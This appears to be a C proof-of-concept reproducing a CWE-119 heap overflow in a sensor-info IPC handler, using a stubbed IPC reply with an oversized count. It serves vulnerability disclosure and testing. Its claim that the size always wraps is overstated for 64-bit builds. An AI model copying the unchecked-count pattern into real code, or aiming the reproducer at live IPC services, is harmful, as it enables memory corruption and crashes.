/*
 * PoC: CWE-119 - Attacker-controlled allocation size via unsanitized IPC input
 *
 * Vulnerability: In GetSensorInfos(), the value of notify->count is read from
 * an IPC reply buffer via ReadInt32() without any upper-bound validation.
 * This value is then used directly in:
 *   malloc(sizeof(SensorInfo) * notify->count)
 *
 * An attacker controlling the IPC reply can set notify->count to an extremely
 * large value (e.g., 0x7FFFFFFF), causing:
 *   1. Integer overflow in sizeof(SensorInfo) * notify->count, leading to a
 *      small allocation but a large loop count -> heap buffer overflow in memcpy_s
 *   2. Or a massive allocation causing OOM / denial of service
 *
 * The only check is (notify->count <= 0), so any positive value passes through.
 *
 * CWE: CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)
 * Expected behavior: Heap buffer overflow or integer overflow in malloc size calculation,
 *                    leading to crash (SIGSEGV/SIGABRT)
 *
 * Call chain: main() -> GetSensorInfos(owner, reply)
 *   where reply is a crafted IPC buffer with malicious count value
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

/* ============================================================
 * Stub definitions for external dependencies NOT in the chain
 * ============================================================ */

/* Stub logging macros */
#define HILOG_MODULE_APP 0
#define HILOG_DEBUG(module, fmt, ...)  do { } while(0)
#define HILOG_ERROR(module, fmt, ...)  do { } while(0)

/* Error codes */
#define SENSOR_ERROR_INVALID_PARAM (-1)

/* SensorInfo structure - representative of the real structure */
typedef struct {
    int32_t sensorId;
    char sensorName[64];
    char vendorName[64];
    int32_t sensorTypeId;
    int32_t sensorVersion;
    float maxRange;
    float precision;
    float power;
} SensorInfo;

/* SensorNotifyBuffer - the owner structure */
typedef struct {
    int32_t retCode;
    int32_t count;
    SensorInfo **sensorInfo;
} SensorNotifyBuffer;

typedef void *IOwner;

/*
 * Simulated IPC reply buffer.
 * We craft this to deliver attacker-controlled values via ReadInt32/ReadUint32/ReadBuffer.
 */
typedef struct {
    uint8_t *data;
    size_t size;
    size_t cursor;
} IpcIo;

/* Global crafted data buffer for ReadBuffer to return */
static uint8_t g_fake_sensor_data[sizeof(SensorInfo)];

/*
 * Stub: ReadInt32 - reads a 32-bit integer from the IPC buffer
 * This simulates the attacker-controlled IPC channel.
 */
static int g_read_int32_call = 0;
void ReadInt32(IpcIo *reply, int32_t *value)
{
    g_read_int32_call++;
    if (g_read_int32_call == 1) {
        /* First call: retCode - must be >= 0 to pass the check */
        *value = 0;
        printf("[PoC] ReadInt32 call #1: retCode = 0 (passes retCode >= 0 check)\n");
    } else if (g_read_int32_call == 2) {
        /*
         * Second call: notify->count
         * WHY THIS TRIGGERS THE BUG:
         * Setting count to 0x40000001 (1073741825). With sizeof(SensorInfo) likely
         * being ~148 bytes, the multiplication overflows:
         *   148 * 0x40000001 = wraps around to a small value
         * malloc() allocates a tiny buffer, but the loop iterates 0x40000001 times,
         * causing a massive heap buffer overflow.
         */
        *value = 0x40000001;  /* Attacker-controlled large count */
        printf("[PoC] ReadInt32 call #2: notify->count = 0x40000001 (attacker-controlled!)\n");
        printf("[PoC]   sizeof(SensorInfo) = %zu\n", sizeof(SensorInfo));
        printf("[PoC]   sizeof(SensorInfo) * count = %zu (integer overflow!)\n",
               sizeof(SensorInfo) * (size_t)0x40000001);
    }
}

void ReadUint32(IpcIo *reply, uint32_t *value)
{
    /* Return a small len so ReadBuffer succeeds */
    *value = sizeof(SensorInfo);
    printf("[PoC] ReadUint32: len = %u\n", *value);
}

uint8_t *ReadBuffer(IpcIo *reply, size_t len)
{
    /* Return pointer to our fake sensor data (non-NULL to pass the check) */
    printf("[PoC] ReadBuffer: returning fake sensor data buffer\n");
    memset(g_fake_sensor_data, 'A', sizeof(g_fake_sensor_data));
    return g_fake_sensor_data;
}

/* Stub memcpy_s - returns 0 (success) to allow the overflow loop to continue */
int memcpy_s(void *dest, size_t destMax, const void *src, size_t count)
{
    /* This will write out of bounds when dest points past the small allocation */
    memcpy(dest, src, count);
    return 0;
}

/* ============================================================
 * REAL vulnerable function from the call chain
 * ============================================================ */

/* Chain step: main -> GetSensorInfos */
int32_t GetSensorInfos(IOwner owner, IpcIo *reply)
{
    printf("[PoC] GetSensorInfos: begin\n");
    SensorNotifyBuffer *notify = (SensorNotifyBuffer *)owner;
    if (notify == NULL) {
        printf("[PoC] GetSensorInfos: notify is null\n");
        return SENSOR_ERROR_INVALID_PARAM;
    } else {
        ReadInt32(reply, &(notify->retCode));
        if (notify->retCode < 0) {
            printf("[PoC] GetSensorInfos: retCode < 0, aborting\n");
            return SENSOR_ERROR_INVALID_PARAM;
        }
        /* VULNERABILITY: notify->count is read from attacker-controlled IPC with no upper bound */
        ReadInt32(reply, &(notify->count));
        uint32_t len = 0;
        ReadUint32(reply, &len);
        uint8_t *data = (uint8_t *)ReadBuffer(reply, (size_t)len);
        if ((notify->count <= 0) || (data == NULL)) {
            printf("[PoC] GetSensorInfos: count <= 0 or data NULL\n");
            notify->retCode = SENSOR_ERROR_INVALID_PARAM;
            return SENSOR_ERROR_INVALID_PARAM;
        }
        SensorInfo *sensorInfo = (SensorInfo *)(data);

        printf("[PoC] About to malloc(sizeof(SensorInfo) * notify->count)\n");
        printf("[PoC]   = malloc(%zu * %d)\n", sizeof(SensorInfo), notify->count);
        printf("[PoC]   = malloc(%zu) -- potentially overflowed!\n",
               sizeof(SensorInfo) * (size_t)notify->count);

        /* TRIGGER: malloc with attacker-controlled size that has integer-overflowed
         * sizeof(SensorInfo) * notify->count wraps around to a small value due to
         * integer overflow, but the loop below iterates notify->count times,
         * writing far beyond the allocated buffer. */
        *(notify->sensorInfo) = (SensorInfo *)malloc(sizeof(SensorInfo) * notify->count);
        if (*(notify->sensorInfo) == NULL) {
            printf("[PoC] GetSensorInfos: malloc failed (OOM for large alloc)\n");
            notify->retCode = SENSOR_ERROR_INVALID_PARAM;
            return SENSOR_ERROR_INVALID_PARAM;
        }

        printf("[PoC] malloc succeeded, now looping %d times writing SensorInfo structs...\n",
               notify->count);
        printf("[PoC] THIS WILL OVERFLOW THE HEAP BUFFER!\n");

        /* TRIGGER: Heap buffer overflow - loop writes notify->count entries
         * into a buffer that is much smaller due to integer overflow in malloc size */
        for (int32_t i = 0; i < notify->count; i++) {
            if (i < 3 || i == notify->count - 1) {
                printf("[PoC]   memcpy_s iteration %d (writing at offset %zu)\n",
                       i, (size_t)i * sizeof(SensorInfo));
            } else if (i == 3) {
                printf("[PoC]   ... (continuing overflow writes) ...\n");
            }
            if (memcpy_s((*(notify->sensorInfo) + i), sizeof(SensorInfo), (sensorInfo + i),
                sizeof(SensorInfo))) {
                free(*(notify->sensorInfo));
                *(notify->sensorInfo) = NULL;
                notify->retCode = SENSOR_ERROR_INVALID_PARAM;
                return SENSOR_ERROR_INVALID_PARAM;
            }
        }
        return notify->retCode;
    }
}

/* ============================================================
 * Main - crafts malicious input and triggers the vulnerability
 * ============================================================ */
int main(void)
{
    printf("[PoC] === CWE-119: Unsanitized IPC count -> malloc integer overflow ===\n");
    printf("[PoC] Crafting malicious IPC reply with count = 0x40000001\n\n");

    /* Set up the owner/notify structure */
    SensorInfo *sensorInfoPtr = NULL;
    SensorNotifyBuffer notify;
    memset(&notify, 0, sizeof(notify));
    notify.sensorInfo = &sensorInfoPtr;

    /* Set up a fake IPC reply (content doesn't matter, stubs handle reads) */
    IpcIo reply;
    memset(&reply, 0, sizeof(reply));

    printf("[PoC] Calling GetSensorInfos with crafted IPC reply...\n\n");

    /* Chain step: main -> GetSensorInfos
     * The crafted IPC reply will provide:
     *   retCode = 0 (passes >= 0 check)
     *   count = 0x40000001 (huge, causes integer overflow in malloc)
     *   len = sizeof(SensorInfo) (small, so ReadBuffer returns non-NULL)
     *   data = valid pointer to small buffer
     *
     * Result: malloc allocates small buffer, loop writes 0x40000001 entries -> CRASH
     */
    int32_t ret = GetSensorInfos((IOwner)&notify, &reply);

    printf("\n[PoC] GetSensorInfos returned: %d\n", ret);
    printf("[PoC] If we reached here without crash, the malloc was large (no overflow on this platform)\n");
    printf("[PoC] But the vulnerability exists: no upper bound check on notify->count\n");

    /* Cleanup */
    if (sensorInfoPtr) {
        free(sensorInfoPtr);
    }

    return 0;
}